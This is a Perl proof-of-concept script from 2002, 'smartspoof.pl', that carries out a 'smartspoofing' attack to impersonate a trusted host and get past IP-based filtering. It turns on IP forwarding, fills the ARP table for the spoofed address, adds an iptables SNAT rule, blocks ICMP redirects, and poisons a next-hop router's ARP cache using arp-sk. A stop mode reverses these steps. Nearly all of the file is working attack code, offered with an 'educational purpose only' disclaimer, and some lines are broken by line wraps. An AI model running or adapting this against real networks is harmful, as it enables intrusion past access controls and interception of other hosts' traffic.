#!/usr/bin/perl -w
#
# smartspoof.pl
#
# This script is provided as proof of concept for educational purpose only
#
# Laurent Licour 28/10/02
# llicour@althes.fr
# Althes (http://www.althes.fr)
#
# Start/Stop smartspoofing
# http://www.althes.fr/ressources/avis/smartspoofing.htm
#
# Require linux 2.4 (tested on Redhat 7.3)
# Require NetAddr::IP perl package (www.cpan.org)
# Require arp-sk tool (www.arp-sk.org)
# Require arp-fillup tool (www.althes.fr/ressources/avis/smartspoofing.htm)
# Require iptables (www.iptables.org)

use strict;
use Getopt::Long;
use NetAddr::IP;

sub get_ip_next_hop
{
  my ($ip0, $int) = @_;
  my $ip=new NetAddr::IP $ip0;
  open(ROUTE, "route -n |");
  <ROUTE>; <ROUTE>;
  my $gateway="";
  my $masklen; my @fields; my $line; my $entry;
  while($line = <ROUTE>)
  {
    @fields = split / +/, $line;
    $entry=new NetAddr::IP($fields[0] . "/" . $fields[2]);
    if ($entry->contains($ip))
    {
      if (($gateway eq "") or ($masklen < $entry->masklen()))
      {
        $gateway = $fields[1];
        $masklen = $entry->masklen();
        $$int = $fields[7];
        chop $$int;
      }
    }
  }
  die "Error : No route for $ip \n" if ($gateway eq "");
  $gateway=$ip->addr() if ($gateway eq "0.0.0.0");

  return($gateway);
}

sub get_mac
{
  my $ip=shift;
  my $cmd="ping -c 1 -w 1 $ip >/dev/null 2>&1";
  system($cmd);
  $cmd="cat /proc/net/arp | grep $ip' ' | awk '{print \$4}'";
  my $mac=`$cmd`;
  chop($mac);
  return($mac);
}

sub usage
{
  print "Start/Stop de smartspoofing\n\n";
  print "This is the proof of concept of the smartspoofing technique\n";
  print "(visit http://www.althes.fr/ressources/avis/smartspoofing.htm)\n";
  print "\n";
  print "You only have to specify :\n";
  print " -D : address of the filtering equipement to connect to\n";
  print " -S : address of the trusted host to spoof\n";
  print "\n";
  print "Then, you only need to launch your favorite client software from
this host\n";
  print "or any host behind this (because it is now a router)\n";
  print "\n";
  print "This script is provided as proof of concept for educational purpose
only.\n";
  print "\n";

  exit 0;
}

my $syntax = "syntax: $0 [-i eth0] [-h] [-v] -D <\@IP destination> -S <\@=
IP
source> -start|-stop\n";

my $ver = "smartspoof.pl v1.0 28/10/02\n";

my ($ipsrc, $ipdst);
my ($start, $stop);
my $interface = "";
my ($version, $help);

Getopt::Long::GetOptions(
           "D=s" => \$ipdst,
           "S=s" => \$ipsrc,
           "i=s" => \$interface,
           "v" => \$version,
           "h" => \$help,
           "start" => \$start,
           "stop" => \$stop
          ) or die $syntax;


usage if $help;
die $ver if $version;
die $syntax unless @ARGV == 0;
die $syntax unless defined($ipsrc) and defined($ipdst);
die $syntax unless defined($start) or defined($stop);
die $syntax if $start and $stop;

my $cmd;

my ($intsrc, $intdst);
my $ipsrc_next_hop = get_ip_next_hop($ipsrc, \$intsrc);
my $ipdst_next_hop = get_ip_next_hop($ipdst, \$intdst);
$interface=$intdst if ($interface eq "");


if ($start)
{
  print "Activate IP Forwarding\n";
  system("echo 1 > /proc/sys/net/ipv4/ip_forward");

  print "Activate Arp fillup on $ipsrc\n";
  system("arp-fillup -i $interface -D $ipsrc >/dev/null 2>&1 &");

  print "Set NAT rule on iptables\n";
  $cmd="iptables -t nat -A POSTROUTING -o $interface -d $ipdst -j SNAT --=
to
$ipsrc";
  system($cmd);

  print "Desactivate ICMP Redirect\n";
  system("iptables -A OUTPUT -p icmp --icmp-type host-redirect -j DROP");

  print "Activate Arp cache poisoning of $ipsrc_next_hop entry on
$ipdst_next_hop on $interface\n";
  $cmd="arp-sk -w -i $interface -d $ipdst_next_hop -S $ipsrc_next_hop -D
$ipdst_next_hop -c 1 >/dev/null 2>&1";
  system($cmd);
  $cmd="arp-sk -r -i $interface -d $ipdst_next_hop -S $ipsrc_next_hop -D
$ipdst_next_hop >/dev/null 2>&1 &";
  system($cmd);
}
elsif ($stop)
{
  print "Suppress Arp fillup on $ipsrc\n";
  system("killall arp-fillup");

  print "Suppress Arp cache poisoning of $ipsrc_next_hop entry on
$ipdst_next_hop\n";
  system("killall arp-sk");
  my $mac=get_mac($ipsrc_next_hop);
  $cmd="arp-sk -r -c 1 -i $interface -d $ipdst_next_hop -S
$ipsrc_next_hop:$mac -D $ipdst_next_hop >/dev/null 2>&1";
  system($cmd);

  print "Clear iptables rules\n";
  system("service iptables stop");
  system("service iptables start");

  print "Desactivate ip forwarding\n";
  system("echo 0 > /proc/sys/net/ipv4/ip_forward");
}
